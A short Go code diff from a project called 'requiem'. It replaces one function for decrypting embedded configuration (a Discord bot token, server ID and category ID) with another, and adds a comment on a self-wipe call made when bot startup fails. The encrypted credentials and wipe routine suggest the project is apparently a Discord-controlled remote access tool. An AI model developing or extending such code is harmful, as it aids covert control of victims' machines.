@@ -12,6 +12,8 @@ import (
 	"requiem/utils"
 	"requiem/utils/discord"
 
+	"shared/higher"
+
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -24,12 +26,12 @@ var (
 )
 
 func Start() {
-	store.DecryptedServerID = utils.Decrypt(store.SERVER_ID)
+	store.DecryptedServerID = higher.DecryptConfig(store.SERVER_ID)
 
-	bot, err := discordgo.New("Bot " + utils.Decrypt(store.BOT_TOKEN))
+	bot, err := discordgo.New("Bot " + higher.DecryptConfig(store.BOT_TOKEN))
 	if err != nil {
 		utils.DebugLog(fmt.Sprintf("failed to create bot - %v", err))
-		funcs.Wipe(false)
+		funcs.Wipe(false) // this will literally never fail
 		return
 	}
 
@@ -55,7 +57,7 @@ func Start() {
 	store.LoadSettings()
 	registerCommands()
 
-	categoryID := utils.Decrypt(store.CATEGORY_ID)
+	categoryID := higher.DecryptConfig(store.CATEGORY_ID)
 	if categoryID == "" {
 		categoryID, err = discord.FindCategory(bot)
 		if err != nil {
